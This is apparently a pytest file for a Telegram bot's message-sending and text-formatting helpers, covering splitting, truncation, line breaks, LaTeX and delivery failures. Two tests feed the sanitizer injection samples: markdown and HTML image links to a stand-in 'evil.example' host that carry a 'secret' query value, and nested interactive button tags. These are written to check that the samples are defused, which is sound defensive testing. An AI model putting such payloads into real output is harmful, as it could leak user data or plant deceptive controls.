from aiogram.types import Message

from derp.telegram.sender import Target, sanitize_untrusted, split_rich
from derp.telegram.text import hard_breaks, split_text, truncate, utf16_len


def test_utf16_measure_counts_astral_as_two() -> None:
    assert utf16_len("a😀") == 3


def test_split_prefers_paragraphs_and_respects_limit() -> None:
    text = "para one is here\n\npara two is here\n\npara three"
    chunks = split_text(text, 20)
    assert chunks == ["para one is here", "para two is here", "para three"]
    emoji = "😀" * 10
    assert all(utf16_len(chunk) <= 8 for chunk in split_text(emoji, 8))
    assert "".join(split_text(emoji, 8)) == emoji


def test_truncate() -> None:
    assert truncate("short", 10) == "short"
    assert utf16_len(truncate("word " * 50, 20)) <= 20


def test_split_rich_repairs_code_fences() -> None:
    body = "```python\n" + "x = 1\n" * 40 + "```"
    chunks = split_rich(body, limit=80)
    assert len(chunks) > 1
    assert all(chunk.count("```") % 2 == 0 for chunk in chunks)
    assert chunks[1].startswith("```python\n")


def test_untrusted_markdown_loses_interactive_tags() -> None:
    text = 'ok <tg-button type="callback" data="approve:1">Run</tg-button> <tg-thinking>x</tg-thinking>'
    assert "tg-button" not in sanitize_untrusted(text)
    assert "tg-thinking" not in sanitize_untrusted(text)


def test_target_from_topic_message() -> None:
    message = Message.model_validate(
        {
            "message_id": 9,
            "date": 0,
            "chat": {"id": -100, "type": "supergroup", "is_forum": True},
            "message_thread_id": 4,
            "is_topic_message": True,
        }
    )
    target = Target.reply_to_message(message)
    assert target == Target(-100, 4, 9)
    reply = target.reply_parameters
    assert reply is not None and reply.allow_sending_without_reply
    plain = message.model_copy(update={"is_topic_message": None})
    assert Target.reply_to_message(plain).thread_id is None


def test_nested_tags_cannot_reassemble() -> None:
    nasty = '<tg-<tg-button>button type="callback" data="buy">Buy</tg-<tg-button>button>'
    assert "tg-button" not in sanitize_untrusted(nasty)


def test_split_keeps_code_indentation() -> None:
    code = "def f():\n" + "    x = 1\n" * 30
    chunks = split_text(code, 60)
    assert all(not chunk.startswith("x") for chunk in chunks[1:])
    assert chunks[1].startswith("    x = 1")


def test_untrusted_markdown_cannot_make_telegram_fetch_urls() -> None:
    text = (
        '![](https://evil.example/?d=secret "cap") ![x][ref] <img src="https://evil.example/a.png">'
        " ![22:45](tg://time?unix=1647531900) [ok](https://t.me/)"
    )
    cleaned = sanitize_untrusted(text)
    assert "![" not in cleaned.replace("![22:45](tg://", "") and "<img" not in cleaned
    assert '[link](https://evil.example/?d=secret "cap")' in cleaned and "[x][ref]" in cleaned
    assert "![22:45](tg://time?unix=1647531900)" in cleaned and "[ok](https://t.me/)" in cleaned
    assert sanitize_untrusted("!![](https://e/x)") == "[link](https://e/x)"  # no media reassembled


async def test_a_failure_after_the_first_part_reports_what_was_delivered() -> None:
    from datetime import UTC, datetime
    from typing import Any, cast

    import pytest
    from aiogram import Bot
    from aiogram.exceptions import TelegramForbiddenError
    from aiogram.methods import SendRichMessage
    from aiogram.types import Chat

    from derp.telegram.sender import RICH_CHUNK, PartialDeliveryError, send_markdown

    class Flaky:
        calls = 0

        async def send_rich_message(self, **fields: Any) -> Message:
            self.calls += 1
            if self.calls > 1:
                raise TelegramForbiddenError(
                    SendRichMessage(chat_id=1, rich_message=fields["rich_message"]), "blocked"
                )
            return Message(message_id=10, date=datetime.now(UTC), chat=Chat(id=1, type="private"))

    long = "\n\n".join("word " * (RICH_CHUNK // 6) for _ in range(4))
    with pytest.raises(PartialDeliveryError) as caught:
        await send_markdown(cast(Bot, Flaky()), Target(1), long)
    assert [m.message_id for m in caught.value.sent] == [10]


def test_line_breaks_stay_line_breaks_outside_code() -> None:
    text = "**Commands**\n/settings — settings\n/buy — buy\n\nNext\n```py\na = 1\nb = 2\n```\n- one\n- two"
    assert hard_breaks(text) == (
        "**Commands**  \n/settings — settings  \n/buy — buy\n\nNext\n```py\na = 1\nb = 2\n```\n- one  \n- two"
    )


def test_existing_hard_breaks_and_single_lines_are_left_alone() -> None:
    assert hard_breaks("one  \ntwo\\\nthree") == "one  \ntwo\\\nthree"
    assert hard_breaks("just one line") == "just one line"
    assert hard_breaks("~~~\nx\ny\n~~~\nz\nw") == "~~~\nx\ny\n~~~\nz  \nw"


async def test_plain_fallback_never_shows_link_previews() -> None:
    from datetime import UTC, datetime
    from typing import Any, cast

    from aiogram import Bot
    from aiogram.exceptions import TelegramBadRequest
    from aiogram.methods import SendRichMessage
    from aiogram.types import Chat

    from derp.telegram.sender import send_markdown

    class RichRefused:
        def __init__(self) -> None:
            self.plain: list[dict[str, Any]] = []

        async def send_rich_message(self, **fields: Any) -> Message:
            raise TelegramBadRequest(SendRichMessage(chat_id=1, rich_message=fields["rich_message"]), "bad")

        async def send_message(self, **fields: Any) -> Message:
            self.plain.append(fields)
            return Message(
                message_id=len(self.plain), date=datetime.now(UTC), chat=Chat(id=1, type="private")
            )

    bot = RichRefused()
    text = "see https://example.com — and $$\\int_0^1 x\\,dx$$ is $\\tfrac12$"
    for trusted in (True, False):
        await send_markdown(cast(Bot, bot), Target(1), text, trusted=trusted)
    assert len(bot.plain) == 2
    for fields in bot.plain:  # aiogram drops an explicit None, and Telegram's default shows previews
        preview = fields["link_preview_options"]
        assert preview is not None and preview.is_disabled
        assert "$\\tfrac12$" in fields["text"]  # maths stays raw text in the fallback


def test_formula_blocks_keep_their_raw_latex() -> None:
    text = "Area:\n$$\n\\begin{aligned}\nA &= \\pi r^2\n\\end{aligned}\n$$\nso\nthere\n$$E = mc^2$$\nend"
    assert hard_breaks(text) == (
        "Area:  \n$$\n\\begin{aligned}\nA &= \\pi r^2\n\\end{aligned}\n$$  \nso  \nthere  \n$$E = mc^2$$  \nend"
    )
    assert hard_breaks("$$ x = 1\ny = 2 $$\nz") == "$$ x = 1\ny = 2 $$  \nz"
    assert hard_breaks("costs $$$\nreally\nmuch") == "costs $$$  \nreally  \nmuch"  # unpaired: not a formula
